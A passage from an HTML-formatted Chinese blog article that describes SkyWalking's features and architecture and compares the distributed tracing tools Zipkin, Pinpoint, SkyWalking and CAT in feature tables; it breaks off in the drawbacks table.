<li style="text-align:left"><span style="background-color:#ffffff"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Go and C++ SDKs.</span></span></span></li>
<li style="text-align:left"><span style="background-color:#ffffff"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Browser agent.</span></span></span></li>
<li style="text-align:left"><span style="background-color:#ffffff"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Service Mesh Observability. </span></span></span></li>
<li style="text-align:left"><span style="background-color:#ffffff"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Metrics system, including Prometheus.</span></span></span></li>
<li style="text-align:left"><span style="background-color:#ffffff"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Logs.</span></span></span></li>
<li style="text-align:left"><span style="background-color:#ffffff"><span style="background-color:#ffffff"><span style="color:#4f4f4f">Zipkin v1/v2 trace.(No Analysis)</span></span></span></li>
</ol>
<h2 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">3</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、SkyWalking优点</span></span>
</h2> 
<ol>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">支持多语言探针监控。</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">支持自动及手动探针。</span></span></li>
</ol>
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">自动探针：在使用过程中，完全是0代码，无侵入,无需修改程序源代码; </span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">手动探针：它支持手动探针去追踪业务方法OpenTrackingApi、@Trace注解、trackId集成到日志中。</span></span></p> 
<ol>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">多种后端存储：ElasticSearch，Mysql，TiDB， H2。采用elasticsearch做数据存储，能够达到实时搜索、稳定、可靠</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">现代化Web UI。提供了良好的可视化管理界面，包括应用、实例、服务性能指标分析、拓扑图、分布式追踪、性能预警。</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">日志集成</span></span></li>
<li style="text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">应用、实例和服务的告警</span></span></li>
</ol>
<p style="margin-left:.0001pt;text-align:justify"></p> 
<h2 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">4</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、SkyWalking架构</span></span>
</h2> 
<h3 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">4.1</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、架构图</span></span>
</h3> 
<p style="margin-left:.0001pt;text-align:justify"><img alt="" height="274" src="https://images2.imgbox.com/bc/be/qZ2ITk2v_o.png" width="554"></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<p style="margin-left:.0001pt;text-align:justify"><img alt="" height="323" src="https://images2.imgbox.com/2c/23/TU48Jt88_o.png" width="554"></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<p style="margin-left:.0001pt;text-align:justify"><strong><span style="background-color:#ffffff"><span style="color:#4f4f4f">说明：</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">上面的架构图看似模块繁多，但在实际使用时我们并不需要关注太多的实现方式。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">HTTP</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">、gRPC 、GraphQL 这些都是其内部架构使用到的技术，我们只需安装 SkyWalking Collecter、Elasticsearch 或 H2，然后在需要追踪的服务内配置少量的代码（Java 项目通过修改 JVM 参数即可），最后通过 SkyWalking UI 查看结果。</span></span></p> 
<h3 style="margin-left:0;text-align:justify">
<span style="background-color:#ffffff"><span style="color:#00b0f0">4.2</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">、三大组件</span></span>
</h3> 
<p><span style="background-color:#ffffff"><span style="color:#00b0f0">4.2.1</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">概述</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">SkyWalking</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">总体架构分为三部分</span></span></p> 
<ul>
<li style="text-align:justify">
<span style="background-color:#ffffff"><span style="color:#4f4f4f">skywalking-agent</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">：探针，用来收集和发送数据到归集器。</span></span>
</li>
<li style="text-align:justify">
<span style="background-color:#ffffff"><span style="color:#4f4f4f">skywalking-collector</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">：链路数据归集器，数据可以落地ElasticSearch，单机也可以落地H2，不推荐，H2仅作为临时演示用。</span></span>
</li>
<li style="text-align:justify">
<span style="background-color:#ffffff"><span style="color:#4f4f4f">skywalking-web</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">：web可视化平台，用来展示落地的数据。</span></span>
</li>
</ul>
<p><span style="background-color:#ffffff"><span style="color:#00b0f0">4.2.2</span></span><span style="background-color:#ffffff"><span style="color:#00b0f0">关系</span></span></p> 
<p><span style="background-color:#ffffff"><span style="color:#000000">4.2.2.1</span></span><span style="background-color:#ffffff"><span style="color:#000000">、部署组件</span></span></p> 
<ul>
<li style="text-align:justify">
<span style="background-color:#ffffff"><span style="color:#4f4f4f">ES</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">：其中数据存储建议使用elasticsearch</span></span>
</li>
<li style="text-align:justify">
<span style="background-color:#ffffff"><span style="color:#4f4f4f">agent</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">：探针，获取应用信息</span></span>
</li>
<li style="text-align:justify">
<span style="background-color:#ffffff"><span style="color:#4f4f4f">collector</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">：主要为收集agent发送过来的数据，和为web提供接口服务</span></span>
</li>
<li style="text-align:justify">
<span style="background-color:#ffffff"><span style="color:#4f4f4f">web</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">：主要提供UI监控服务</span></span>
</li>
</ul>
<p><span style="background-color:#ffffff"><span style="color:#000000">4.2.2.2</span></span><span style="background-color:#ffffff"><span style="color:#000000">、关系说明</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">通过在应用程序中添加 SkyWalking Agent，就可以将接口、服务、数据库、MQ等进行追踪，将追踪结果通过 HTTP 或 gRPC 发送到 SkyWalking Collecter。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">SkyWalking Collecter </span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">经过分析和聚合，将结果存储到 Elasticsearch 或 H2。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">SkyWalking </span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">同时提供了一个 SkyWalking UI 的可视化界面，UI 以 GraphQL + HTTP 方式获取存储数据进行展示。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"></p> 
<h1 style="margin-left:0cm"><span style="background-color:#ffffff"><span style="color:#00b0f0">三、分布式追踪系统对比</span></span></h1> 
<h2 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">1</span><span style="color:#00b0f0">、常见技术</span>
</h2> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">市场常见调用链技术：Zipkin，Pinpoint，SkyWalking，CAT。</span></span></p> 
<h2 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">2</span><span style="color:#00b0f0">、技术特点</span>
</h2> 
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">2.1</span><span style="color:#00b0f0">、Zipkin</span>
</h3> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">是</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">Twitter</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">开源的调用链分析工具，目前基于springcloud sleuth得到了广泛的使用。特点是</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">轻量</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">，使用</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">部署简单</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">。</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">起步最早</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">，社区体系最为完备。支持语言最为丰富。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">但是</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">功能较简单</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">。支持技术栈spring-cloud。</span></span></p> 
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">2.2</span><span style="color:#00b0f0">、Pinpoint</span>
</h3> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">是</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">韩国</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">人开源的基于字节码注入的调用链分析，以及应用监控分析工具，</span></span><span style="background-color:#ffffff"><span style="color:#515151">使用java编写</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">特点是支持多种插件，UI功能强大，接入端无代码侵入。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#515151">使用java探针字节码增加技术，实现对整个应用的监控。对应用零侵入。</span></span></p> 
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">2.3</span><span style="color:#00b0f0">、SkyWalking</span>
</h3> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">是中国开源的基于字节码注入的调用链分析以及应用监控分析工具。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#515151">2015</span></span><span style="background-color:#ffffff"><span style="color:#515151">年由个人吴晟（华为开发者）开源 ， 2017年加入Apache孵化器，2018年加入Apache顶级孵化项目。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">特点是支持多种插件，UI功能较强，接入端无代码侵入。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#24292e">其核心是个分布式追踪系统。</span></span><span style="background-color:#ffffff"><span style="color:#515151">使用java探针字节码增加技术，实现对整个应用的监控。对应用零侵入。</span></span></p> 
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">2.4</span><span style="color:#00b0f0">、CAT</span>
</h3> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">是</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">大众点评</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">开源的基于编码和配置的调用链分析，应用监控分析，日志采集，监控报警等一系列的监控平台工具。</span></span></p> 
<p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#4f4f4f">集成方案是通过</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">代码埋点</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">的方式来实现监控，比如： 拦截器，注解，过滤器等。   对代码的</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">侵入性</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">很大，</span></span><span style="background-color:#ffffff"><span style="color:#ff0000">集成成本</span></span><span style="background-color:#ffffff"><span style="color:#4f4f4f">较高。风险较大。</span></span></p> 
<h2 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">3</span><span style="color:#00b0f0">、特性对比</span>
</h2> 
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">3.1</span><span style="color:#00b0f0">实现方式</span>
</h3> 
<table border="1" cellspacing="0"><tbody>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>类别</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Zipkin</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Pinpoint</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>SkyWalking</strong></p> </td>
<td style="border-color:#000000;width:83pt"> <p style="margin-left:.0001pt;text-align:center"><strong>CAT</strong></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">实现方式</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">拦截请求，发送（HTTP，mq）数据至zipkin服务</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">java</span></span><span style="background-color:#ffffff"><span style="color:#767171">探针，字节码增强</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">java</span></span><span style="background-color:#ffffff"><span style="color:#767171">探针，字节码增强</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">代码埋点（拦截器，注解，过滤器等）</span></span></p> </td>
</tr>
</tbody></table>
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">3.2</span><span style="color:#00b0f0">接入方式</span>
</h3> 
<table border="1" cellspacing="0"><tbody>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>类别</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Zipkin</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Pinpoint</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>SkyWalking</strong></p> </td>
<td style="border-color:#000000;width:83pt"> <p style="margin-left:.0001pt;text-align:center"><strong>CAT</strong></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">接入方式</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">引入配置</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">javaagent</span></span><span style="background-color:#ffffff"><span style="color:#767171">字节码</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">javaagent</span></span><span style="background-color:#ffffff"><span style="color:#767171">字节码</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">代码侵入</span></span></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">OpenTracing</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">×</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">×</span></span></p> </td>
</tr>
</tbody></table>
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">3.3</span><span style="color:#00b0f0">通信方式</span>
</h3> 
<table border="1" cellspacing="0"><tbody>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>类别</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Zipkin</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Pinpoint</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>SkyWalking</strong></p> </td>
<td style="border-color:#000000;width:83pt"> <p style="margin-left:.0001pt;text-align:center"><strong>CAT</strong></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">agent</span></span></strong><strong><span style="background-color:#ffffff"><span style="color:#767171">到collector通信</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">http,MQ</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">thrift</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">gRPC</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">http/tcp</span></span></p> </td>
</tr>
</tbody></table>
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">3.4</span><span style="color:#00b0f0">常见特性</span>
</h3> 
<table border="1" cellspacing="0"><tbody>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>类别</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Zipkin</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Pinpoint</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>SkyWalking</strong></p> </td>
<td style="border-color:#000000;width:83pt"> <p style="margin-left:.0001pt;text-align:center"><strong>CAT</strong></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">颗粒度</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">接口级</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">方法级</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">方法级</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">代码级</span></span></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">全局调用统计</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">×</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">traceid</span></span></strong><strong><span style="background-color:#ffffff"><span style="color:#767171">查询</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">×</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">×</span></span></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">报警</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">×</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">JVM</span></span></strong><strong><span style="background-color:#ffffff"><span style="color:#767171">监控</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">×</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">×</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">√</span></span></p> </td>
</tr>
</tbody></table>
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">3.5</span><span style="color:#00b0f0">数据存储</span>
</h3> 
<table border="1" cellspacing="0"><tbody>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>类别</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Zipkin</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Pinpoint</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>SkyWalking</strong></p> </td>
<td style="border-color:#000000;width:83pt"> <p style="margin-left:.0001pt;text-align:center"><strong>CAT</strong></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">数据存储</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">ES</span></span><span style="background-color:#ffffff"><span style="color:#767171">，mysql,</span></span></p> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">Cassandra,</span></span><span style="background-color:#ffffff"><span style="color:#767171">内存</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">Hbase</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">ES</span></span><span style="background-color:#ffffff"><span style="color:#767171">，H2，mysql, TiDB</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">mysql,hdfs</span></span></p> </td>
</tr>
</tbody></table>
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">3.6 UI</span><span style="color:#00b0f0">展示</span>
</h3> 
<table border="1" cellspacing="0"><tbody>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>类别</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Zipkin</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Pinpoint</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>SkyWalking</strong></p> </td>
<td style="border-color:#000000;width:83pt"> <p style="margin-left:.0001pt;text-align:center"><strong>CAT</strong></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">健壮度</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">**</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">****</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">****</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:justify"><span style="background-color:#ffffff"><span style="color:#767171">*****</span></span></p> </td>
</tr>
</tbody></table>
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">3.7</span><span style="color:#00b0f0">社区活跃度</span>
</h3> 
<table border="1" cellspacing="0"><tbody>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>类别</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Zipkin</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Pinpoint</strong></p> </td>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong>SkyWalking</strong></p> </td>
<td style="border-color:#000000;width:83pt"> <p style="margin-left:.0001pt;text-align:center"><strong>CAT</strong></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><strong><span style="background-color:#ffffff"><span style="color:#767171">github STAR</span></span></strong></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><span style="background-color:#ffffff"><span style="color:#767171">8.4k-&gt;14.6k</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><span style="background-color:#ffffff"><span style="color:#767171">5.9k-&gt;11.6k</span></span></p> </td>
<td style="width:82.95pt"> <p style="margin-left:.0001pt;text-align:center"><span style="background-color:#ffffff"><span style="color:#767171">3.3k-&gt;17.5k</span></span></p> </td>
<td style="width:83pt"> <p style="margin-left:.0001pt;text-align:center"><span style="background-color:#ffffff"><span style="color:#767171">4.9k-15.8k</span></span></p> </td>
</tr>
</tbody></table>
<h3 style="margin-left:0;text-align:justify">
<span style="color:#00b0f0">3.8</span><span style="color:#00b0f0">缺点</span>
</h3> 
<table border="1" cellspacing="0"><tbody>
<tr>
<td style="border-color:#000000;width:35.2pt"> <p style="margin-left:.0001pt;text-align:center"><strong>类别</strong></p> </td>
<td style="border-color:#000000;width:134.65pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Zipkin</strong></p> </td>
<td style="border-color:#000000;width:78pt"> <p style="margin-left:.0001pt;text-align:center"><strong>Pinpoint</strong></p> </td>
<td style="border-color:#000000;width:70.85pt"> <p style="margin-left:.0001pt;text-align:center"><strong>SkyWalking</strong></p> </td>
<td style="border-color:#000000;width:96.1pt"> <p style="margin-left:.0001pt;text-align:center"><strong>CAT</strong></p> </td>
</tr>
<tr>
<td style="border-color:#000000;width:35.2pt"> <p style="margin-left:.0001pt;text-align:center"><strong>缺点</strong></p> </td>
<td style="width:134.65pt"> <p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><span style="color:#767171">默认使用的http请求向zipkin上报信息，耗性能；</span></span></p> <p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><span style="color:#767171">跟sleuth结合可以使用rabbitMQ的方式异步来做，增加了复杂度，需要引入rabbitMQ ；</span></span></p> <p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><span style="color:#767171">数据分析比较简单。</span></span></p> </td>
<td style="width:78pt"> <p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><span style="color:#767171">不支持查询单个调用链， 对外表现的是整个应用的调用生态；</span></span></p> <p style="margin-left:.0001pt;text-align:left"><span style="background-color:#ffffff"><span style="color:#767171">二次开发难度较高。</span></span></p> </td>
